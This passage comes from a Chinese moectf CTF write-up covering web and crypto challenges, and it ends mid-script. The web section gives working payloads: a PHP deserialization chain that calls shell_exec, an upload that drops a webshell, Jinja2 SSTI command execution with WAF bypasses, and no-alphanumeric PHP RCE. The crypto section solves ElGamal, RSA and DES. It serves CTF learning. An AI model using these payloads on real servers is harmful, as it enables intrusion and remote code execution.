PHP_EOL;?&gt;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:1:&#123;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:0:&#123;&#125;&#125;s:3:&quot;age&quot;;s:0:&quot;&quot;;&#125;s:2:&quot;id&quot;;s:7:&quot;__Check&quot;;s:3:&quot;age&quot;;s:8:&quot;cat flag&quot;;&#125;\n\n23.第十九章_revenge&lt;?phphighlight_file(__FILE__);class Person&#123;    public $name;    public $id;    public $age;&#125;class PersonA extends Person&#123;    public function __destruct()    &#123;        $name = $this-&gt;name;//name设置成new personC对象        $id = $this-&gt;id;//id即函数名        $name-&gt;$id($this-&gt;age); name=new personC,id=check,age=env    &#125;&#125;class PersonB extends Person&#123;    public function __set($key, $value)    &#123;        $this-&gt;name = $value;    &#125;    public function __invoke($id)    &#123;        $name = $this-&gt;id;        $name-&gt;name = $id;        $name-&gt;age = $this-&gt;name;    &#125;&#125;class PersonC extends Person&#123;    public function check($age)    &#123;        $name=$this-&gt;name;        if($age == null)        &#123;            die(&quot;Age can&#x27;t be empty.&quot;);        &#125;        else if($name === &quot;system&quot;)        &#123;            die(&quot;Hacker!&quot;);        &#125;        else        &#123;            var_dump($name($age));        &#125;    &#125;    public function __wakeup()    &#123;        $name = $this-&gt;id;//这里$name需要为personB对象触发invoke        $name-&gt;age = $this-&gt;age;        $name($this);//__invoke触发点,    &#125;&#125;if(isset($_GET[&#x27;person&#x27;]))&#123;    $person = unserialize($_GET[&#x27;person&#x27;]);&#125;\n\n链尾在personC的var_dump里,在personA中动态调用$id($this-&gt;age),personC中$this是 PHP 中指向当前对象的指针\n&lt;?phpclass Person &#123;    public $name;    public $id;    public $age;&#125;class PersonA extends Person &#123;&#125;class PersonB extends Person &#123;&#125;class PersonC extends Person &#123;&#125;// 嵌套对象$p1 = new Person();$pb = new PersonB();$pb-&gt;id = $p1;$pc = new PersonC();$pc-&gt;name = &quot;shell_exec&quot;;  // 长度自动为 10$pc-&gt;id = $pb;$pc-&gt;age = &quot;&quot;;$pa = new PersonA();$pa-&gt;name = $pc;$pa-&gt;id = &quot;check&quot;;$pa-&gt;age = &quot;cat flag&quot;;// 序列化$serialized = serialize($pa);echo $serialized . PHP_EOL;?&gt;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:10:&quot;shell_exec&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonB&quot;:1:&#123;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:0:&#123;&#125;&#125;s:3:&quot;age&quot;;s:0:&quot;&quot;;&#125;s:2:&quot;id&quot;;s:5:&quot;check&quot;;s:3:&quot;age&quot;;s:3:&quot;env&quot;;&#125;\n\n\nmoectf&#123;832295b9-1e23-6426-dfd4-a7385f5504cf&#125;\n\n24.神秘的手镯_revenge提示\nwanyanzhou.txt里面了......但是我忘记密码是啥了，而且不小心把保存密码的文件删了......HDdss：这...应该有备份吧？K皇：确实有\n\n访问wanyanzhou.txt.bak,得到密钥,\n\n用bp抓请求包抓不到,将原来的页面按 F12 打开，发现被反调试了\n我们右键左侧的 shouzhuo.js 向忽略列表添加脚本，然后点右侧的继续执行脚本，即可继续调试：\n\n然后点设置，禁用 javascript ，将刚才的 10000 长度的密码复制进去：再bp抓包,最后发到爆破模块重复五百次NULL payload即可\n\nmoectf&#123;d3a28e96-b84f-5518-4c0d-c65597fd4712&#125;\n\n25.第十五章 归真关·竞时净魔我们创建一个文件 1.php，只要访问就会生成一个木马文件，其内容为：\nGIF89a&lt;?php file_put_contents(&quot;2.php&quot;,&quot;&lt;?php eval(\\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;);?&gt;\n\nbp抓包,改mime,然后发到爆破模块,继续用NULL payload爆破\n然后在写一个脚本一直访问1.php\nimport threading, requests, timeBASE = &quot;http://127.0.0.1:57743&quot;TARGET = BASE + &quot;/uploads/1.php&quot;THREADS = 10TIMEOUT = 2stop = threading.Event()counter = &#123;&quot;req&quot;: 0, &quot;hit&quot;: 0&#125;lock = threading.Lock()def fetcher(idx):    sess = requests.Session()    while not stop.is_set():        try:            url = f&quot;&#123;TARGET&#125;?_=&#123;int(time.time()*1000)&#125;&quot;            r = sess.get(url, timeout=TIMEOUT)            with lock:                counter[&quot;req&quot;] += 1            if r.status_code == 200:                with lock:                    counter[&quot;hit&quot;] += 1                print(f&quot;[HIT] Thread-&#123;idx&#125; got 200, len=&#123;len(r.content)&#125;&quot;)                print(&quot;  前20字节:&quot;, r.content[:20])        except Exception as e:            pass def reporter():    while not stop.is_set():        time.sleep(3)        with lock:            print(f&quot;[STAT] total=&#123;counter[&#x27;req&#x27;]&#125; hits=&#123;counter[&#x27;hit&#x27;]&#125;&quot;) if __name__ == &quot;__main__&quot;:    print(&quot;[*] 疯狂访问:&quot;, TARGET)    for i in range(THREADS):        threading.Thread(target=fetcher, args=(i,), daemon=True).start()    threading.Thread(target=reporter, daemon=True).start()    try:        while True:            time.sleep(1)    except KeyboardInterrupt:        stop.set()        print(&quot;[*] 停止。&quot;)\n\n直到返回的字节有gif89a为止,蚁剑连2.php\n\n```### 26.幽冥血海·幻语心魔给了app.py```pythonfrom flask import Flask, request, render_template, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    if &#x27;username&#x27; in request.args or &#x27;password&#x27; in request.args:        username = request.args.get(&#x27;username&#x27;, &#x27;&#x27;)        password = request.args.get(&#x27;password&#x27;, &#x27;&#x27;)        if not username or not password:            login_msg = &quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;        else:            login_msg = render_template_string(f&quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎: &#123;username&#125;&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;)    else:        login_msg = &quot;&quot;    return render_template(&quot;index.html&quot;, login_msg=login_msg)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=80)\n\nusername可控并且存在ssti\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;\n\n\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()&#125;&#125;\n\n\nmoectf&#123;a53a1e79-698c-d929-a976-4afcbddd6b32&#125;\n\n27.往生漩涡·言灵死局这题多了个waf\nfrom flask import Flask, request, render_template, render_template_stringapp = Flask(__name__)blacklist = [&quot;__&quot;, &quot;global&quot;, &quot;&#123;&#123;&quot;, &quot;&#125;&#125;&quot;]@app.route(&#x27;/&#x27;)def index():    if &#x27;username&#x27; in request.args or &#x27;password&#x27; in request.args:        username = request.args.get(&#x27;username&#x27;, &#x27;&#x27;)        password = request.args.get(&#x27;password&#x27;, &#x27;&#x27;)        if not username or not password:            login_msg = &quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;        else:            login_msg = render_template_string(f&quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎：&#123;username&#125;&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;)            for blk in blacklist:                if blk in username:                    login_msg = &quot;&quot;&quot;                    &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                        &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;                        &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;Error&lt;/div&gt;&lt;/div&gt;                    &lt;/div&gt;                    &quot;&quot;&quot;    else:        login_msg = &quot;&quot;    return render_template(&quot;index.html&quot;, login_msg=login_msg)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=80)\n\n&#123;%print (cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;].os.popen(&#x27;ls /&#x27;)).read()%&#125;app bin dev entrypoint.sh etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var\n\n&#123;%print (cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;].os.popen(&#x27;cat /f*&#x27;)).read()%&#125;\n\n\nmoectf&#123;0e58bf14-90e9-97dd-a2e8-64f6708bea38&#125;\n\n28.血海核心·千年手段&#123;&#123;lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;protocol_version&quot;,lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;strings+/usr/bin/rev&#x27;).read())&#125;&#125;\n\n\n&#123;&#123;lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;protocol_version&quot;,lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;/usr/bin/rev%20--HDdss%20cat%20/flag&#x27;).read())&#125;&#125;\n\n\nmoectf&#123;7c0228bd-3da2-1827-3848-fe54399acdf6&#125;\n\n29.这是…Webshell?&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;shell&#x27;])) &#123;    $shell = $_GET[&#x27;shell&#x27;];    if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;, $_GET[&#x27;shell&#x27;])) &#123;        eval($shell);    &#125; else &#123;        echo &quot;Hacker!&quot;;    &#125;&#125;?&gt;\n\n无数字无字母rce\nhttps://www.cnblogs.com/pursue-security/p/15404150.html\n一般都是通过异或或者取反\n$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);POST:_=system(cat /f*);\n\n\nmoectf&#123;0f39c886-86fe-94d9-1247-062f339c9b5f&#125;\n\n30.这是…Webshell?_revenge&lt;?phphighlight_file(__FILE__);if (isset($_GET[&#x27;shell&#x27;])) &#123;    $shell = $_GET[&#x27;shell&#x27;];    if (strlen($shell) &gt; 30) &#123;        die(&quot;error: shell length exceeded&quot;);    &#125;    if (preg_match(&quot;/[A-Za-z0-9_$]/&quot;, $shell)) &#123;        die(&quot;error: shell not allowed&quot;);    &#125;    eval($shell);&#125;\n\n临时文件rce,看p牛的文章:https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nexp:\nPOST /index.php?shell=%3f%3e%3c%3f%3d%60%2e%20%2f%3f%3f%3f%2f%3f%3f%3f%3f%3f%3f%3f%3f%5b%40%2d%5b%5d%60%3b%3f%3e HTTP/1.1Host: 127.0.0.1:53669Content-Length: 292Cache-Control: max-age=0DNT: 1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysDh6g03MqJBgoRi2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: close------WebKitFormBoundarysDh6g03MqJBgoRi2Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain#!/bin/shcat /flag------WebKitFormBoundarysDh6g03MqJBgoRi2Content-Disposition: form-data; name=&quot;submit&quot;shang------WebKitFormBoundarysDh6g03MqJBgoRi2--\n\n\nmoectf&#123;c40c34e4-5121-e752-8741-e97209bcc5dc&#125;\n\n\n\n\n\n密码Crypto入门指北from Crypto.Util.number import long_to_bytes# 替换为你的真实参数p = 11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863c1 = 6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863c2 = 2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983x = 8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214# ElGamal解密步骤s = pow(c1, x, p)            # s = c1^x mod ps_inv = pow(s, -1, p)        # 计算s的模逆m = (c2 * s_inv) % p         # 计算明文整数m# 转换为字节串，解码为字符串（一般UTF-8）flag_bytes = long_to_bytes(m)print(flag_bytes.decode())\n\n\nmoectf&#123;th1s_1s_y0ur_f1rst_ElG@m@l&#125;\n\nbaby_nextfrom gmpy2 import isqrt, next_primefrom Crypto.Util.number import long_to_bytesimport math# 题目给定的参数n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967e = 65537# 计算n的平方根作为p的估计值sqrt_n = isqrt(n)# 定义搜索范围：根据素数间隔理论，p应位于 sqrt(n) - 4e7 附近search_range = 40000000  # 4000万start = max(2, sqrt_n - search_range)  # 搜索起点end = sqrt_n                            # 搜索终点# 步骤1：在估算范围内搜索能整除n的素数found = Falsep = Nonefor candidate in range(start, end + 1):    # 检查是否整除    if n % candidate == 0:        # 验证候选数是否为素数（小素数快速验证）        if next_prime(candidate - 1) == candidate:            p = candidate            found = True            break    # 每处理10万个数字显示进度    if (candidate - start) % 100000 == 0:        progress = (candidate - start) / (end - start) * 100        print(f&quot;扫描进度: &#123;progress:.2f&#125;%&quot;)if not found:    raise ValueError(&quot;未找到合适的素数因子p，尝试扩大搜索范围&quot;)# 计算另一个素数因子qq = n // pprint(f&quot;找到因子: p = &#123;p&#125;&quot;)print(f&quot;q = &#123;q&#125;&quot;)# 步骤2：验证q确实是p的第114514个后继素数current = pfor count in range(1, 114515):  # 需要114514次next_prime    current = next_prime(current)    # 显示进度    if count % 10000 == 0:        print(f&quot;验证进度: &#123;count&#125;/114514&quot;)if current != q:    raise ValueError(&quot;q不是p的后继第114514个素数，请检查搜索逻辑&quot;)print(&quot;验证通过：q是p的第114514个后继素数&quot;)phi = (p - 1) * (q - 1)d = pow(e, -1, phi)m = pow(c, d, n)flag = long_to_bytes(m)print(&quot;解密后的Flag:&quot;, flag.decode())\n\n\nmoectf&#123;vv0W_p_m1nu5_q_i5_r34l1y_sm4lI&#125;\n\nez_squarefrom Crypto.Util.number import long_to_bytes, inverse, isPrimeimport math# 已知数据n = 83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149c = 69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190hint = 5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304e = 65537# 1. 枚举 k 找到 (p+q)for k in range(1, 1000):    s2 = hint + k * n  # s^2 = hint + k*n    s = math.isqrt(s2)    if s * s == s2:        print(f&quot;[+] Found s = p+q with k=&#123;k&#125;&quot;)        breakelse:    raise ValueError(&quot;s not found&quot;)# 2. 解 p,q# s^2 - 4n = (p-q)^2diff2 = s * s - 4 * nt = math.isqrt(diff2)if t * t != diff2:    raise ValueError(&quot;Not a square for p-q&quot;)p = (s + t) // 2q = (s - t) // 2assert p * q == nassert isPrime(p) and isPrime(q)print(&quot;[+] p =&quot;, p)print(&quot;[+] q =&quot;, q)# 3. 计算私钥 dphi = (p - 1) * (q - 1)d = inverse(e, phi)# 4. 解密m = pow(c, d, n)flag = long_to_bytes(m)print(&quot;[+] FLAG =&quot;, flag.decode())&#x27;&#x27;&#x27;moectf&#123;Ma7hm4t1c5_is_@_k1nd_0f_a2t&#125;&#x27;&#x27;&#x27;\n\nez_DESfrom Crypto.Cipher import DESimport itertoolsimport string# 已知密文c = b&#x27;\\xe6\\x8b0\\xc8m\\t?\\x1d\\xf6\\x99sA&gt;\\xce \\rN\\x83z\\xa0\\xdc&#123;\\xbc\\xb8X\\xb2\\xe2q\\xa4&quot;\\xfc\\x07&#x27;# DES key 前 5 位已知prefix = &quot;ezdes&quot;charset = string.ascii_letters + string.digits + string.punctuation# 爆破后三位for combo in itertools.product(charset, repeat=3):    key_str = prefix + &#x27;&#x27;.join(combo)    key = key_str.encode(&#x27;utf-8&#x27;)    cipher = DES.new(key, DES.MODE_ECB)    pt = cipher.decrypt(c)    # 检查解密结果    if b&quot;moectf&#123;&quot; in pt:        print(&quot;[+] Found key:&quot;, key_str)        print(&quot;[+] Plaintext (raw):&quot;, pt)        print(&quot;[+] Plaintext (decoded):&quot;, pt.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))        break&#x27;&#x27;&#x27;[+] Found key: ezdes8br[+] Plaintext (raw): b&#x27;moectf&#123;_Ju5t envmEra+e.!&#125;\\x19\\x19\\x19\\x19\\x19\\x19\\x19&#x27;[+] Plaintext (decoded): moectf&#123;_Ju5t envmEra+e.!&#125;&#x27;&#x27;&#x27;\n\n# recover_flag.pyfrom Crypto.Util.number import long_to_bytesimport math# 已知参数（从你给出的数据粘贴）p = 258669765135238783146000574794031096183a = 144901483389896508632771215712413815934ciphertext = [102230607782303286066661803375943337852, 196795077203291879584123548614536291210, 41820965969318717978206410470942308653, 207485265608553973031638961376379316991, 126241934830164184030184483965965358511, 20250852993510047910828861636740192486, 103669039044817273633962139070912140023, 97337342479349334554052986501856387313, 159127719377115088432849153087501377529, 45764236700940832554086668329121194445, 35275004033464216369574866255836768148, 52905563179465420745275423120979831405, 17032180473319795641143474346227445013, 29477780450507011415073117531375947096, 55487351149573346854028771906741727601, 121576510894250531063152466107000055279, 69959515052241122548546701060784004682, 173839335744520746760315021378911211216, 28266103662329817802592951699263023295, 194965730205655016437216590690038884309, 208284966254343254016582889051763066574, 137680272193449000169293006333866420934, 250634504150859449051246497912830488025, 124228075953362483108097926850143387433, 232956176229023369857830577971626577196, 149441784891021006224395235471825205661, 118758326165875568431376314508740278934, 222296215466271835013184903421917936512, 49132466023594939909761224481560782731, 406286678537520849308828749751513339, 215122152883292859254246948661946520324, 81283590250399459209567683991648438199, 150395133067480380674905743031927410663, 5710878479977467762548400320726575491, 83627753774286426170934105100463456109, 164968224377869331545649899270867630850, 241057183685774160581265732812497247167, 109136287048010096863680430193408099828, 116313129605409961931811582899075031153, 202739016625709380026000805340243458300, 25408225921774957745573142542576755590, 151336258796933656160956289529558246702, 2947189044370494063643525166023973095, 228678413963736672394976193093568181979, 40627063032321835707220414670018641024, 55446789315226949622969082042881319148, 32219108726651509070669836923591948459, 134454924722414419191920784435633637634, 97952023967728640730045857104376826039, 20659076942504417479953787092276592682, 93281761173713729777326842152860901050, 133634773495582264000160065317239987936, 79976720152435218818731114555425458470, 234654694673289327542859971371886984118, 51332273108989067644245919615090753756, 134120280423303717489979349737802826605, 182001158305920226320085758522717203725, 98408798757865562737462169470346158516, 78200435603900368619334272308272773797, 232796357836930341547987600782979821555, 589106968861493082018132081244848952, 24186003230092331554886767628744415123, 236070626491251466741246103662922841423, 238699080882667864827094121849090696547, 141659873734297659078160283051728812410, 228977113517120063860252637394240795552, 236613527842969921794004708284265628300, 145522034982744654991661857596541755396, 249608374387044047328725156440984678776, 325110572051913836681821746093704556, 171492052199838424502681030556098576483, 156498865212994371079795360268866413702, 196747701509389071931992996873572785043, 70811811603137896158765356680364490781, 83672551582385607422240464086955462541, 117961603623637997457153763936550310698, 224448821395214505399297116719025174412, 4598815373009554321735225938200807251, 194892269604260726530091473301914449005, 127484628022155760909820605666827662175, 208706240846212140439291547368645656474, 14102286481104997303651684152195298336, 6129503335471304345451795609683770657, 103799668048593149396277157385628834185, 185813375481410513002496683918106238351, 233491689316882978147517340230794025796, 46274083097168831187719988888816378961, 119487551553664772614629936285345836934, 84340029922118279362389419277915602509, 88253743193124528032223101368846247085, 227895357640018330099501504941388167432, 92189947144174433744195727086236905626, 83114957902192791332190922428847199876, 173535754090441937731619031520699325122, 192309407933789484835602071782330798398, 255421921600128994923738650157598053776, 155535082468314012733563336837641958625, 49064798421022327310707074253263463055, 161216416471071644769301963857685054031, 252480348817188872515008985698620059851, 75854882798183185741756645038434215611, 256065006192683011190132982128640682537, 87507510173514424105732562474643251223, 163309795132131534875147566536485288212, 253583084320404985699510129361746869059, 253300112521651972637580307326576568313, 239027717080729650738678032571840680727, 117444657686971615526398894470673026034, 215470942802874046857958621181684551426, 58767098748728136687851735836323448020, 249357164697409977883764098879705065535, 174705348385893117518084017669958647345, 211108767177375215605155301209259781232, 57829566748907062397366819001461941421, 88265742700024922112974862134385921564, 80952107622167923709226013231566882261, 236078582132483864916117213281193714198, 193448482646563141692726575550417225891, 245972799166806058223048506073553726233, 10132977708896091601871557249244373666, 201785418152654519825849206312616081028, 15169816744048531212384271865884567710, 122545328290385950043826822277924297182, 202918646192255177261567701479991753600, 32696887488223731055835744711207261936, 88319352182963224921157305627381030375, 92381505322264045777004475690398861771, 189745654013352563126968415157143821842, 152254915005998949299817641843658795579, 198032433618991362619448347415342295581, 84073892809321676935569114878067118319, 82243805869584256211699602267760745768, 61994229948266781537191603999495995852, 253668765227759797787675352833142466255, 38865376724677211964966907748953557125, 134615436811268347303232550777225944929, 176932422465426107783498083830285780588, 207573742393618910694054452362826628208, 200033130835394442710748301293534928706, 127536063935293533700918451145963158658, 219125698281820710910675956971948816959, 179795893258398750139395156587561075767, 69649628109726874051635160004398498964, 241433717681314766463039563422535023524, 202664264135718511331695232476272832350, 205151096657425932591242432052912914182, 210305712465948130683966275157181140301, 196555690055906934925300527324955477733, 66817932643964538216259564711698986077, 95270796440975607179107356182889534333, 123226880424532374188134357659879826495, 53506495440223773538415807620524749240, 19253217887083870834249774316467647628, 165699356396365023442008488156823647206, 107809175498119862854792975070673056027, 250453989887421415931162217952559757164, 171492052199838424502681030556098576483, 133778166882550119563444625306816232463, 149009301604122447269581792013291889175, 9982418254629616281350713836647603294, 203486292122499140756846060502464655972, 157686696123400087437836943220926921848, 88338919773540412238116717043122711811, 113265824169274322024623493892867211478, 5549372099744960679418616304893848801, 12431828907518852062050349123660880165, 183957934738536914983862053251433028750, 42027289270308356303682029801998790750, 117406080036483925915502666019795783905, 154312255292300186042636734144948304054, 143706917273862261295046346995206133170, 50088136095338601440516112338120787526, 250634504150859449051246497912830488025, 8073010289877796888705519374892639903, 40049582814576788803483039836229025416, 227012342545923833983403067401561291645, 201776603581414625783054400184026088994, 55474945478884522762318445841998187357, 221515530211550293408010846844218019597, 172650752042211610909190315288155597255, 67046194931321172530462444254204111483, 207435868835185636819659137800256834557, 188063222224545200294767050268070647452, 58099349021260301211275261896736590564, 23598877596106927870697531042828774738, 58546308516383335224739442370238545000, 58125311541947998710088435169901475101, 238219925698115060748249043752036454438, 203910234934340893915761800653823457631, 190854889967769152565565000250829375099, 37573623890629846209257307181880876288, 226220240200270623843038279593586687278, 144246075981535671790438155977352345487, 14665770553338784222331493932533448756, 37992062606775322664977502677838074649, 47370175759976523832233910009306151684, 97047813247943880266351445874642842468, 237607444658797800072728280983357541134, 174853113478993738890584814806707459112, 17104608155861584438824639050715857607, 83639027011494777283064583268678718843, 237826165608708003941944469905843354705, 231707683915242052796886276983724691027, 146089830852925550139294146760718642221, 25604562707667550478623425477029052785, 108577663147976992047614498924706939204, 69040319834829375335287614995435269276, 169933229202934375632745753379104389929, 72693008284867494808267387710985847974, 158548279589965576940349068403862889270, 49458101234256610254825879149914255140, 24389558269688411084589654047215902968, 210567980379246548727819953025607019254, 110423375132252997825868399832298953831, 109589895677661968369424757992411668628, 66177577069199763925999718357846633613, 83602293803708828242273186265396676466, 172226271050176278536911356541786290551, 85799805809703976643034084477579915867, 179399990302447560847151603157937241688, 81687654752229170984692833277072534294, 160766441640281044008645821822296569868, 100306680611749750243920501921769642984, 42195187332833922597871030332905266026, 238918420772178508359295233180536910768, 221685929158944699801776621298532178665, 209349638787804999657456057184702655805, 183953393268431043006359511952782903516, 137364333131365794683132159746962959967, 15637689373906596015395350692459218048, 145956368418289159411911667337899986262, 197987711355277581048877821432652325207, 125421308989313724733467092345532539875, 90525081516582408488547894471421476595, 107405840115256692042814887586009104950, 71587500700172519801649824611045199280, 10155721246869986043302768283257682883, 100522792569358427133597834727509523742, 244473925018526409824670892423775482110, 50746138425761666610345252577572889037, 142188269919422432629363225167297071042, 8235113926890598897465093754260801947, 174540885017405784646782293055852044631, 171949847901434672429841435895697323702, 34391199559497599434575002007581170988, 7337868660819385932166025474594964373, 89608475952042154068811282935241824949, 162561097613906905390170334328135062933, 252566077272083954707900007055640560669, 4284637988579219107997224848114896904, 220026371387782427901244689037957398829, 86019060485320999498155965142619258089, 19304861731281576405798605142335886482, 123188238667151068575810494833929221938, 125089740978532716086813732154638565196, 252061524500088702951562270741214799294, 89528875472312768404823823905699760649, 63307407053590054220492282094909190524, 24389558269688411084589654047215902968, 43835777110183833958990705735152973942, 196543204310466258426232803779025620993, 225032412767857179129234169288824097261, 50292890880286260984317361296226049436, 64928956886509273090981701066528078331, 25408225921774957745573142542576755590, 235921667882292842303120860570747218086, 217132603855089441017750752624514343437, 11106129204256119599329380588789107048, 147501327490657927610543345089238991876, 158091159632919983870444592039392730373, 254215886971254771885657857148535673338, 129869106474614345624950211566868568809, 10425702332274469498479699675668087022, 136595953187315682777976356839442311764, 1607792140397737044118662059498732982, 23710000155612873207506044342091514799, 118571340370877720354330132780832828911, 194624784476702188629452374731837038856, 51332273108989067644245919615090753756, 240921043405288511960365826273938845156, 158670188709175825212687487436006138030, 133641825913283256858340618209700716053, 43054466484232130048301271684438593412, 20361972967806283315536154125012604660, 135700832615866572032111395529532615300, 160609169788639387827865051539103507016, 100576279475451993660766480883708996211, 215424685541583305069271024253690375127, 60018956375784961551937423504137141702, 107997941230633604720421526632224279451, 219482010609171816035007605036664317041, 22173526221024380740269311947729076493, 249746554302052221287371350978970766087, 93207359085331319264650563354951254906, 221421697282310997113867048083058096452, 61834092635779365101011109381392037516, 162215218701897689647766394615098617152, 141856131587452385513407955541400099703, 177910903795887762773545874929605680469, 228832704523723308335513552177377803295, 229427981969125094398744034150988525118, 217938760689082034514008764751385239765, 3238055163645731541423094980789895030, 42308449860804765793467328093112118974, 254764518926620089428032312378507653680, 215733901156118606036318409454786603209, 59640829345183339336712595595022506261, 33515071724475649656070325837411550208, 51175659069843551646353202764296812462, 211462959696081863041546889096760952490, 230559603938699838189391087728971115767, 85878911733601049548471257838175175563, 214134904074265214033878852207103328297, 160702405980652445507529591230654474171, 223755040649990285320102091954198427148, 166476753890268002826149533120107157745, 26283916639129998224675164834425763384, 232971495542024495583092055361321729894, 79741799146769724681649849525636816379, 228506526471280046809909301748098760369, 167502422063741368765891061653686283332, 26984184590668253713951516794937308166, 105952393031190074432183821281493254, 113823192955281698937767041115166174652, 93264047694114869263275726820602569731, 55481974783112950660682138071588408040, 108961894273530837550182447112767144669, 47975793549419083945738147934068241928, 204024371586357035343484206754422857590, 251859351272989525849999231358507018068, 75939709807860493804628805619699991501, 129031774446142139804436921156668129187, 110764318451937254261883856778359218969, 246404864722813298477426808193494673610, 153818236564405157581869620439634140065, 246125932167584353084676586883038397451]# 1) 生成小于 2^16 的素数列表（sieve）def gen_primes_upto(n):    sieve = bytearray(b&#x27;\\x01&#x27;) * (n+1)    sieve[0:2] = b&#x27;\\x00\\x00&#x27;    for i in range(2, int(n**0.5)+1):        if sieve[i]:            step = i            start = i*i            sieve[start:n+1:step] = b&#x27;\\x00&#x27; * ((n - start)//step + 1)    return [i for i, isprime in enumerate(sieve) if isprime]primes16 = gen_primes_upto(65535)# 2) 恢复比特串bits = []total = len(ciphertext)bases = [a] + [a + d for d in range(1, 11)]  # a, a+1 .. a+10for idx, ci in enumerate(ciphertext, 1):    found = False    # 尝试每个 base 与每个 16-bit 素数 e    for base_idx, base in enumerate(bases):        for e in primes16:            if pow(base, e, p) == 